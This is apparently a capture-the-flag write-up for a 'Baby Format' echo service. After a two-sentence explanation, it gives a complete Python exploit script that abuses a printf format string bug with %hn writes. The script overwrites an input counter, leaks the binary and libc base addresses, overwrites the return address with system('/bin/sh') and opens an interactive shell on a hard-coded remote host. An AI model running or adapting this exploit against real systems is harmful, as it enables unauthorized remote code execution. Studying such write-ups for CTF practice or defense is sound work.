Simple format string vulnerability but we have a limit amount of characters and we can only give it input 3 times. Also we dont directly control any data on the stack.
What I did was overwrite the variable that stores the amount of times we have entered input with some negative value so that we can exploit the bug more than 3 times.

```python
import struct
import socket
import telnetlib
import time

def tcp_connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    return s

def recv_until(s, string):
    received = ""

    while string not in received:
        received += s.recv(1)

    return received

def telnet_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

addr_addr = 0

def read_addr(addr):
    #write lower bytes
    s.send("%" + str(addr_addr & 0xffff) + "x%9$hn")
    time.sleep(1)
    s.send("%" + str(addr & 0xffff) + "x%57$hn")
    time.sleep(1)

    #write higher bytes
    s.send("%" + str((addr_addr + 2) & 0xffff) + "x%9$hn")
    time.sleep(1)
    s.send("%" + str((addr >> 16) & 0xffff) + "x%57$hn")
    time.sleep(1)
    s.send("SOF%14$sEOF")
    response = recv_until(s, "EOF").split("SOF")[1].split("EOF")[0]
    return response

def write_addr(addr, content):
    #write lower bytes for writing to lower bytes
    s.send("%" + str(addr_addr & 0xffff) + "x%9$hn")
    time.sleep(1)
    s.send("%" + str(addr & 0xffff) + "x%57$hn")
    time.sleep(1)

    #write higher bytes for writing to lower bytes
    s.send("%" + str((addr_addr + 2) & 0xffff) + "x%9$hn")
    time.sleep(1)
    s.send("%" + str((addr >> 16) & 0xffff) + "x%57$hn")
    time.sleep(1)

    #write lower bytes to addr
    s.send("%" + str(content & 0xffff) + "x%14$hn")

    #write lower bytes for writing to higher bytes
    s.send("%" + str(addr_addr & 0xffff) + "x%9$hn")
    time.sleep(1)
    s.send("%" + str((addr + 2) & 0xffff) + "x%57$hn")
    time.sleep(1)

    #write higher bytes for writing to higher bytes
    s.send("%" + str((addr_addr + 2) & 0xffff) + "x%9$hn")
    time.sleep(1)
    s.send("%" + str(((addr + 2) >> 16) & 0xffff) + "x%57$hn")
    time.sleep(1)

    #write higher bytes to addr
    s.send("%" + str((content >> 16) & 0xffff) + "x%14$hn")

s = tcp_connect("104.196.99.62", 2222)

#overwrite counter with some negative number so that we can exploit the printf bug more than 3x

recv_until(s, "==== Baby Format - Echo system ====\n")
s.send("%6$xEOF")
addr_addr = int(recv_until(s, "EOF").split("EOF")[0], 16)
counter_addr = addr_addr - 0xc + 2
return_addr_addr = addr_addr + 20
print hex(counter_addr)
time.sleep(1)
s.send("%" + str(counter_addr & 0xffff) + "x%9$hn")
time.sleep(1)
s.send("%65535x%57$hn")

#leak executable section base address

s.send("SOF%7$xEOF")
executable_section = int(recv_until(s, "EOF").split("EOF")[0].split("SOF")[1], 16) - 0x903
print hex(executable_section)

#leak some libc functions so that we can identify the libc version

libc_printf = struct.unpack("I", read_addr(executable_section + 0x1fcc)[:4])[0]
libc_read = struct.unpack("I", read_addr(executable_section + 0x1fc4)[:4])[0]
libc = libc_printf - 0x50b60
libc_system = libc + 0x3cd10
libc_binsh = libc + 0x17b8cf

print "libc", hex(libc)

write_addr(return_addr_addr, libc_system)
write_addr(return_addr_addr + 8, libc_binsh)

time.sleep(1)

s.send("EXIT\n")

telnet_interact(s)
```
